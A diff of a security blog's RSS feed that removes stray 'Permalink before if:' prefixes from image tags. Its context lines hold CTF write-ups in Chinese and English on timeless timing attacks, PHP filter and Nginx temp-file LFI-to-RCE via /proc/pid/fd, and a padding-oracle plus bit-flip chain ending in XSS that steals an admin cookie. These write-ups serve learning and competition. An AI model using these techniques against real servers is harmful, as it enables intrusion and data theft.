@@ -125,7 +125,7 @@
 &lt;/h2>&lt;h3 id="traditional-time-based-leak">Traditional Time-based Leak
 &lt;/h3>&lt;p>众所周知，传统的一般所有基于时间的一些注入，比如 sql 注入等，或多或少都比较依赖于健康的网络情况，比如倘若我想执行一个 sleep 5 ，但是假设这么一个场景，我第一次执行的时候网络不是很好，本来没有注入成功的情况下网络延迟了 5 秒，第二次执行时，网络突然没有延迟了，注入成功情况下，仍然延迟了 5 秒，这样就导致了很大的一些误判。&lt;/p>
 &lt;p>并且实际上，生活中进行基于时间进行的一些攻击，都是如此，都非常依赖于通信过程中每个网络设备的延迟，每个网络设备的延迟都会对你发送出去的报文产生不同的影响。&lt;/p>
-&lt;p>Permalink before if: https://s4.ax1x.com/2022/02/20/HOdLtI.png&lt;img src="https://s4.ax1x.com/2022/02/20/HOdLtI.png"
+&lt;p>&lt;img src="https://s4.ax1x.com/2022/02/20/HOdLtI.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>那如何降低或者避免这些通信过程中网络设备带来的影响呢？在 29th usenix 上的这篇论文给了我们答案：&lt;a class="link" href="https://www.usenix.org/system/files/sec20-van_goethem.pdf" target="_blank" rel="noopener"
@@ -159,7 +159,7 @@ loading="lazy"
 &lt;/ul>
 &lt;/li>
 &lt;/ul>
-&lt;p>Permalink before if: https://s4.ax1x.com/2022/02/20/HOuKJA.png&lt;img src="https://s4.ax1x.com/2022/02/20/HOuKJA.png"
+&lt;p>&lt;img src="https://s4.ax1x.com/2022/02/20/HOuKJA.png"
 loading="lazy"
 >&lt;/p>
 &lt;ul>
@@ -172,7 +172,7 @@ loading="lazy"
 &lt;/ul>
 &lt;p>举个简单的例子，如果我们可以满足同时发出两个报文 AB 并且他们也同时到达，Timeless Timing 攻击需要做的就是重复多组发送报文的操作，并统计他们返回的先后顺序，如果服务器处理两个报文后没有产生延迟的现象，那么这两个报文会被立即返回，因为返回顺序不受我们控制，并且可能受到&lt;strong>返程&lt;/strong>通信过程中的网络影响，所以返回的先后顺序概率为 50% 及 50% ；如果服务器在处理 B 报文时会差生延迟现象，诸如比 A 要多进行一遍解密、查询等耗时的操作，那么 B 会比 A 要稍晚才能返回，这样一来，尽管响应报文在通信过程中仍然会受到一些影响，但是我们可以多次测量来统计这个概率，此时 B 比 A 先返回的概率回明显小于 50% ，于是我们可以通过这个概率来判断两个请求是否在服务器处理时产生了延迟。&lt;/p>
 &lt;p>并且论文当中也对比了传统时间攻击与 Timeless Timing 攻击之间的各自区分一定时间延迟所需要的请求&lt;/p>
-&lt;p>Permalink before if: https://s4.ax1x.com/2022/02/20/HOuIOK.png&lt;img src="https://s4.ax1x.com/2022/02/20/HOuIOK.png"
+&lt;p>&lt;img src="https://s4.ax1x.com/2022/02/20/HOuIOK.png"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="intended-solution---practice-section">Intended Solution - Practice Section
@@ -207,12 +207,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817607.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817607.png"
+&lt;/div>&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817607.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们可以看到，这些我们要比较的请求都是通过一个个单独的 HTTP/2 的报文都是分别发送的，没有满足 Timeless Timing 攻击的要求；尽管这两个请求的报文几近同时发送出去，但是按照先去先回的顺序，在左图的计数当中，数字 N 代表我们通过代码测试 &lt;code>flag{aa&lt;/code> 要比 &lt;code>flag{ab&lt;/code> 先返回的次数为 N ，例如第一个数字 8 就是前者要先比后者先返回的次数为 8 次，而我们的预期结果应该是两者返回顺序概率均为 50% 左右，从结果以及流量来看，直接顺序执行 fetch 顺序并没有让两个请求满足尽量同时发出的条件。&lt;/p>
 &lt;p>好在我们作者其实为我们指明了方向：&lt;/p>
-&lt;p>Permalink before if: https://s4.ax1x.com/2022/02/21/HXk18f.png&lt;img src="https://s4.ax1x.com/2022/02/21/HXk18f.png"
+&lt;p>&lt;img src="https://s4.ax1x.com/2022/02/21/HXk18f.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里作者提到的 TCP 拥塞控制，其实应该指的是 &lt;a class="link" href="https://baike.baidu.com/item/Nagle%E7%AE%97%E6%B3%95/5645172" target="_blank" rel="noopener"
@@ -230,11 +230,11 @@ loading="lazy"
 &lt;p>简单来说，在 TCP 拥堵的情况下，数据报文会被暂时放到缓存区里，然后等后续数据到了一定程度才会被发送出去。按照这个理论，只要我们能够把 TCP 阻塞到一定程度即可让我们的报文放到缓存区中从而使得我们的两个搜索请求放到一个 TCP 报文当中了。&lt;/p>
 &lt;p>如何让 TCP 产生拥堵呢？在浏览器里我们能进行的操作并不多，最简单最直接的就是直接发送 POST 一个过大 body 的 HTTP 请求即可。&lt;/p>
 &lt;p>此时最理想的状态我们应该可以在 wireshark 中观测到下图所示的情况：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816257.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816257.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816257.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>两个 HTTP/2 请求被系统放到了一个 TCP 报文当中，满足了我们的条件。但是经过测试，需要让每对请求都这样放入到 TCP 报文中，我们需要利用到 &lt;code>tc&lt;/code> 进行一些限制，例如使用 &lt;code>tc&lt;/code> 限制网卡 &lt;code>tc qdisc add dev eth0 root netem delay 100ms 10ms&lt;/code> ，使其网卡对外发包延迟在 100±10 ms ，才能达到我们较为理想的的状态。&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817289.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817289.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211817289.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们可以看出来，第一对请求&lt;code>flag{aa&lt;/code>与&lt;code>flag{ab&lt;/code>主要是区别 a 与 b 两个字符，a 在 4 轮、每轮发送的 10 次请求中，第一轮有 9 次请求先于 b 返回，第二三四轮均 10 次都先于 b 返回，尽管后续字符的对比可能仍然没有理想的五五开，但是这里 a 与 b 已经明显的产生了一边倒的倾向，所以我们可以从中判断出来，&lt;code>flag{a&lt;/code> 的下一个字符就是 b 。后续我们可以以此类推，从而逐个泄露出整个内容。&lt;/p>
@@ -246,7 +246,7 @@ loading="lazy"
 &lt;li>重复以上步骤，每对字符串请求以 10 次或 20 次为一轮，统计每轮请求中对应字符的返回顺序优先关系得到概率，进行多轮（最好大于等于 4 轮）探测&lt;/li>
 &lt;li>根据我们得到的结果频率为依据判断我们探测的字符&lt;/li>
 &lt;/ol>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816311.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816311.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/202202211816311.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>倘若实在是判断不出来怎么办？我们可以将比较相似难以判断的字符的请求顺序切换一下，比如上图中字符 2 跟 3 可能我们探测的结果并不是很好，受到先发先回影响比较大，我们可以把探测字符的请求顺序更换一下，如果他真的产生了延迟，那么他会像最后一组对比请求一样，数字会比较小，最后一组数据意味着字符 f 与字符 1 探测的几组请求中，第一轮 10 次对比请求中只有 1 次 f 优先于 1 返回了，第二轮 10 次对比请求中只有 2 次 f 优先于 1 返回了，而且这已经明显违反了先发先回的策略，所以这里的可以基本断定我们探测的字符是 f 字符。&lt;/p>
@@ -541,7 +541,7 @@ position: relative;
 &lt;/div>
 &lt;/div>&lt;p>我们可以看到，PHP 在处理 Base64 字符串的时候完全忽略了非法字符，并且成功解码了。&lt;/p>
 &lt;p>好，让我们开始试一试吧！尝试 RCE 一句话 &lt;code>include&lt;/code> 吧？！&lt;/p>
-&lt;p>Permalink before if: https://s4.ax1x.com/2022/01/02/TTT0r8.jpg&lt;img src="https://s4.ax1x.com/2022/01/02/TTT0r8.jpg"
+&lt;p>&lt;img src="https://s4.ax1x.com/2022/01/02/TTT0r8.jpg"
 loading="lazy"
 alt="TTT0r8.jpg"
 >&lt;/p>
@@ -818,7 +818,7 @@ alt="TTT0r8.jpg"
 &lt;li>&lt;code>data://,&lt;/code>后的数据是为了方便展示，需要补足一定的位数，当然如果使用 &lt;code>include&lt;/code> 就不能用了，毕竟需要 RFI ，如果 RFI 选项能用，既然都是 RFI 了还整啥 LFI 呢2333&lt;/li>
 &lt;/ul>
 &lt;p>当然通过以上案例，我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用 &lt;code>/etc/passwd&lt;/code>:&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2022/01/03/49007e58-cab9-4d76-a038-76874a94e4fd.png&lt;img src="https://storage.tttang.com/media/attachment/2022/01/03/49007e58-cab9-4d76-a038-76874a94e4fd.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2022/01/03/49007e58-cab9-4d76-a038-76874a94e4fd.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>完成 RCE&lt;/p>
@@ -1324,12 +1324,12 @@ position: relative;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>尝试测试，发现虽然产生了文件夹，但是没有文件，于是我加上了 inotify 监控一下文件行动，并且可以使用 &lt;code>strace&lt;/code> 进一步确认：&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/9055388f-ef61-4628-b036-48b0ab7d3e3b.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/9055388f-ef61-4628-b036-48b0ab7d3e3b.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/9055388f-ef61-4628-b036-48b0ab7d3e3b.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以从 inotify 中看到，几乎 Nginx 是创建完文件就立即删除了，但是我们可以基本确认 Nginx 确实可以产生临时文件，只不过创建就被删除了导致我们无法判断文件内容到底是啥。&lt;/p>
 &lt;p>同时我们可以发现 Niginx 创建临时文件有所规律，为了检查文件内容，我们可以计算出下一次 Nginx 产生临时文件的位置，再对其上级目录使用 &lt;code>chattr +a &lt;/code> 临时禁止临时文件删除，这样我们就可以看到文件内容了：&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/efc3ed0c-eba9-4761-8108-7b7e39d2d368.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/efc3ed0c-eba9-4761-8108-7b7e39d2d368.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/efc3ed0c-eba9-4761-8108-7b7e39d2d368.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到临时文件内容就是我们远程 vps 上放的 tmp 文件内容的一部分。&lt;/p>
@@ -1765,7 +1765,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>编译运行以上代码，我们可以在对应的 &lt;code>/proc/pid/fd&lt;/code> 下找到我们删除的文件 ，可以看到虽然显示是被删除了，但是我们依然可以读取到文件内容，所以我们是不是可以直接用 php 进行文件包含呢？&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/91910e52-9528-46d4-87f7-7ea4905ba9c7.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/91910e52-9528-46d4-87f7-7ea4905ba9c7.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/91910e52-9528-46d4-87f7-7ea4905ba9c7.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="bypass-php-file-stat">Bypass PHP File Stat
@@ -1775,7 +1775,7 @@ loading="lazy"
 &lt;p>&lt;code>php_sys_lstat()&lt;/code>实际上就是linux的&lt;code>lstat()&lt;/code>，这个函数是用来获取一些文件相关的信息，成功执行时，返回0。失败返回-1，并且会设置&lt;code>errno&lt;/code>，因为之前符号链接过多，所以&lt;code>errno&lt;/code>就都是&lt;code>ELOOP&lt;/code>，符号链接的循环数量真正取决于&lt;code>SYMLOOP_MAX&lt;/code>，这是个&lt;code>runtime-value&lt;/code>，它的值不能小于&lt;code>_POSIX_SYMLOOP_MAX&lt;/code>。&lt;/p>
 &lt;/blockquote>
 &lt;p>所以虽然直接包含会显示文件不存在，但是这里依然适用于使用多层符号链接绕过的场景，进而包含执行 php 代码，并且根据一开始我们实验的图看到，其实 Nginx 对于临时文件句柄的关闭往往在最后才进行关闭，所以这个过程中有足够的时间让我们去进行竞争包含。&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/9882b4ce-4414-4d2e-8401-38a70bde4a51.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/9882b4ce-4414-4d2e-8401-38a70bde4a51.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/9882b4ce-4414-4d2e-8401-38a70bde4a51.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="chain-together">Chain Together
@@ -1791,7 +1791,7 @@ loading="lazy"
 &lt;li>虽然 Nginx 删除了&lt;code>/var/lib/nginx/fastcgi&lt;/code>下的临时文件，但是在 &lt;code>/proc/pid/fd/&lt;/code> 下我们可以找到被删除的文件&lt;/li>
 &lt;li>遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI&lt;/li>
 &lt;/ul>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/791b1c5b-9e8f-4682-aca9-2cd84f2065ad.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/791b1c5b-9e8f-4682-aca9-2cd84f2065ad.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/791b1c5b-9e8f-4682-aca9-2cd84f2065ad.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里需要注意的是把握好自己生成的 tmp 文件大小以及 curl 命令，可以生成后自己 debug 看一下 fd 目录下的文件存活多久。&lt;/p>
@@ -1802,7 +1802,7 @@ loading="lazy"
 &lt;p>Determines whether nginx should save the entire client request body into a file&lt;/p>
 &lt;/blockquote>
 &lt;p>虽然这个也需要配置，但是结合我们上文分析的结果，以及之前我们也看到 Nginx 有个相关的目录 &lt;code>/var/lib/nginx/body&lt;/code> ，难不成 Nginx 对于过大的 Request Body 也会产生临时文件？&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/885a8c0e-c747-4e4e-a7ab-7f7780b83267.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/885a8c0e-c747-4e4e-a7ab-7f7780b83267.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/885a8c0e-c747-4e4e-a7ab-7f7780b83267.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里只要试一试就可以了，就不再过多分析了，基本与 Fastcgi 产生临时文件一致，创建临时文件的时候的调用栈：&lt;/p>
@@ -1853,7 +1853,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里简单只用了一句话 &lt;code>include&lt;/code> 作为测试：&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/2af3c122-6989-4282-923b-b29da30d436b.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/2af3c122-6989-4282-923b-b29da30d436b.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/2af3c122-6989-4282-923b-b29da30d436b.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以把发送的报文 Content-Length 头部增加一定数额，并且在发送完数据的时候 &lt;code>sleep&lt;/code> 避免 Nginx 过早关闭，可以看到我们可以直接包含了临时文件执行了 php 代码，这个方法相对 Nginx Fastcgi 的方法来说更实用。&lt;/p>
@@ -1875,7 +1875,7 @@ loading="lazy"
 23:24 &amp;lt;&lt;em>0xbb&lt;/em>&amp;gt; but they were gentle :D&lt;br>&lt;/p>
 &lt;/blockquote>
 &lt;p>赛后官方放出了流量统计图：&lt;/p>
-&lt;p>Permalink before if: https://storage.tttang.com/media/attachment/2021/12/22/c3f92a9e-271f-49ce-b36c-e3ee82883e29.png&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/c3f92a9e-271f-49ce-b36c-e3ee82883e29.png"
+&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2021/12/22/c3f92a9e-271f-49ce-b36c-e3ee82883e29.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到 includer&amp;rsquo;s revenge 这个题流量交互确实很频繁 2333&lt;/p>
@@ -1950,14 +1950,14 @@ loading="lazy"
 &lt;blockquote>
 &lt;p>Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being &lt;code>\x10&lt;/code>.&lt;/p>
 &lt;/blockquote>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png"
 loading="lazy"
 alt="image-20210729103443272"
 >&lt;/p>
 &lt;hr>
 &lt;p>Before moving on, we also need to be fimilar with &lt;strong>AES-CBC&lt;/strong>, which is the most common mode that padding oracle attack can be mounted on.&lt;/p>
 &lt;p>In CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations.&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png"
 loading="lazy"
 alt="image-20210729140911415"
 >&lt;/p>
@@ -1966,7 +1966,7 @@ alt="image-20210729140911415"
 &lt;p>Now, we can dive into the very details on &lt;strong>how the padding oracle works&lt;/strong>.&lt;/p>
 &lt;p>Suppose the attack has possession of a ciphertext which can be divided into an &lt;code>IV&lt;/code> and 3 ciphertext blocks &lt;code>c1, c2, c3&lt;/code> . The purpose of the attacker is to decrypt the last ciphertext block &lt;code>c3&lt;/code>.&lt;/p>
 &lt;p>The attacker changes the last byte of &lt;code>c2&lt;/code> (XORed with some value), and then send it to the server. The server responses with either a &amp;ldquo;&lt;em>PADDING_ERROR&lt;/em>&amp;rdquo; response or a 500 &lt;em>status code&lt;/em> reponse. If we gets a 500 &lt;em>status code&lt;/em> response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with &lt;code>b&amp;quot;\x01&lt;/code>, one of the 16 valid padding format.&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png"
 loading="lazy"
 alt="image-20210729175108696"
 >&lt;/p>
@@ -2068,17 +2068,17 @@ alt="image-20210729175108696"
 &lt;/h2>&lt;p>Recovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want.&lt;/p>
 &lt;p>To achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext.&lt;/p>
 &lt;p>Say the ciphertext &lt;code>IV || c1 || c2 || c3&lt;/code> decrypts into &lt;code>p1 || p2 || p3&lt;/code>, and we want to get the ciphertext of &lt;code>p1' || p2' || p3&lt;/code>.&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181535279.png"
 loading="lazy"
 alt="image-20210729181535279"
 >&lt;/p>
 &lt;p>We first XOR &lt;code>c1&lt;/code> with &lt;code>p2 XOR p2'&lt;/code> to get &lt;code>c1'&lt;/code>. In this way, &lt;code>IV || c1' || c2 || c3 &lt;/code> will be decrypted into &lt;code>junk || p2' || p3&lt;/code>.&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729181301243.png"
 loading="lazy"
 alt="image-20210729181301243"
 >&lt;/p>
 &lt;p>The nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by &lt;code>JSON.parse()&lt;/code>. What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR &lt;code>IV&lt;/code> with &lt;code>junk XOR p1'&lt;/code> to get a new &lt;code>IV'&lt;/code>. In this way, &lt;code>IV' || c1' || c2 || c3&lt;/code> will be decrypted into &lt;code>p1' || p2' || p3&lt;/code>, which is exactly we want!&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729182312222.png"
 loading="lazy"
 alt="image-20210729182312222"
 >&lt;/p>
@@ -2152,16 +2152,16 @@ alt="image-20210729182312222"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping. And then use base64 and aztec code to encode the ciphertext and upload the aztec code. At last, XSS fires!
-Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png"
+&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_24c61b7c1528e0c2deba998c1f559546.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Now, we get the admin&amp;rsquo;s cookie and the source code of the admin&amp;rsquo;s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched &amp;lsquo;Flagger&amp;rsquo; as described in the challenge and got the flag.&lt;/p>
-&lt;p>Permalink before if: https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png"
+&lt;p>&lt;img src="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/upload_3e9d0f71b91d84f0ce56a2fd51c8f38f.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>Thanks for your reading. Hope you like the writeup! XD&lt;/p></description></item><item><title>Two Webs' Writeup in Google CTF Quals 2021</title><link>https://zeddyu.github.io/p/two-webs-writeup-in-google-ctf-quals-2021/</link><pubDate>Wed, 21 Jul 2021 02:58:54 +0000</pubDate><guid>https://zeddyu.github.io/p/two-webs-writeup-in-google-ctf-quals-2021/</guid><description>&lt;p>I played Google CTF Quals 2021 and here is my writeup.&lt;/p>
 &lt;p>I played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldn&amp;rsquo;t do much. Hope I could do more in the next time!&lt;/p>
-&lt;p>Permalink before if: https://s2.loli.net/2025/01/03/8hdbDy5Qq6pGZjf.png&lt;img src="https://s2.loli.net/2025/01/03/8hdbDy5Qq6pGZjf.png"
+&lt;p>&lt;img src="https://s2.loli.net/2025/01/03/8hdbDy5Qq6pGZjf.png"
 loading="lazy"
 alt="1.png"
 >&lt;/p>
@@ -2468,7 +2468,7 @@ alt="1.png"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>At last, we got the flag. Pretty cool, man!&lt;/p>
-&lt;p>Permalink before if: https://s2.loli.net/2025/01/03/tpVkKmgI7qSFR6b.png&lt;img src="https://s2.loli.net/2025/01/03/tpVkKmgI7qSFR6b.png"
+&lt;p>&lt;img src="https://s2.loli.net/2025/01/03/tpVkKmgI7qSFR6b.png"
 loading="lazy"
 alt="2.png"
 >&lt;/p>
@@ -2640,13 +2640,13 @@ position: relative;
 &lt;/h3>&lt;p>在隐式模式下，FTPS 的默认端口在 990 端口上，隐式模式下所有的连接数据均为加密。&lt;/p>
 &lt;p>客户端必须先使用 TLS Client Hello 消息向 FTPS 服务器进行握手来创建加密连接，如果 FTPS 服务器未收到此类消息，则服务器应断开连接。 为了保持与现有的非 FTPS 感知客户端的兼容性，隐式 FTPS 默认在 IANA 规定的端口 990/TCP 上监听 FTPS 控制通道，并在端口 989/TCP 上监听 FTPS 数据通道。这使得管理员可以保留端口(控制通道 21/TCP 与数据通道 20/TCP )以兼容原始的FTP。&lt;/p>
 &lt;p>虽然我没有查找到隐式 FTPS 的相关历史，但是我个人觉得他更像在 SSL 时代应运而生的产物，更符合了 FTP over SSL 的意思，也就是一开始使用 TLS/SSL 进行会话创建，再进行数据加密传输。但 RFC 4217 中未定义隐式模式，因此它也被认为是FTP协商TLS/SSL中过时的早期方法。&lt;/p>
-&lt;p>Permalink before if: https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png&lt;img src="https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png"
+&lt;p>&lt;img src="https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="explicit-mode">Explicit Mode
 &lt;/h3>&lt;p>在显式模式（也称为FTPES）下，FTPS 客户端先与服务器创建明文连接，然后从控制通道明确请求服务端升级为加密连接（命令为: AUTH TLS）。控制通道与数据通道默认端口与原始 FTP 一样也是 21 端口。控制通道始终加密，而数据通道是否加密则为可选项。 同时若服务器未限制明文连接，也可以使用未加密的原始 FTP 进行连接，也就是说服务器在相同的端口上同时提供 FTP 与 FTPS 服务。&lt;/p>
 &lt;p>与FTP协商认证和安全的机制是在 RFC 2228 下增加的，其中包括新的 FTP 命令 AUTH 。虽然该 RFC 没有明确定义任何所需的安全机制，如 SSL 或 TLS ，但它确实要求 FTPS 客户端用一个双方都知道的机制挑战 FTPS 服务器。如果 FTPS 客户端用一个未知的安全机制挑战 FTPS 服务器， FTPS 服务器将以错误代码 504（不支持）响应 AUTH 命令。客户可以通过使用 FEAT 命令查询 FTPS 服务器来确定支持哪些机制，尽管服务器不一定需要诚实地披露它们支持哪些安全级别。调用 FTPS 安全的常见方法包括 AUTH TLS 和 AUTH SSL 。显式方法在 RFC 4217 中定义后，FTPS的合规性要求客户端始终使用 AUTH TLS 方法进行协商。&lt;/p>
-&lt;p>Permalink before if: https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png&lt;img src="https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png"
+&lt;p>&lt;img src="https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以在 RFC 4217 中找到显式 FTPS 建立连接方式：&lt;/p>
@@ -2881,14 +2881,14 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>如果需要用户验证就加上&lt;code>--user&lt;/code>选项即可，不需要的话就不用，结果如图所示：&lt;/p>
-&lt;p>Permalink before if: https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png"
+&lt;p>&lt;img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png"
 loading="lazy"
 >&lt;/p>
